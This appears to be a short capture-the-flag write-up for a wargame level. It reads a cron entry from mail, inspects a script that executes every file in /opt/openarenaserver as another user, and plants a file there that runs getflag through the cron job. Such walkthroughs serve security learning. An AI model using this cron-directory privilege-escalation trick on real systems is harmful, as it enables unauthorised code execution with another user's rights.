@@ -1,0 +1,19 @@
+As you log in, you get a popup saying "You have new mail."
+
+If you read the mail with `cat /var/mail/level05` it shows:
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+This is a shell script that runs regularly and executes the file openarenaserver.
+
+`cat /usr/sbin/openarenaserver`
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+`echo "/bin/getflag > /tmp/flag" > /opt/openarenaserver/getflag`
+
+The cron job should execute this once every 2 minutes and copy flag into /tmp/flag
+
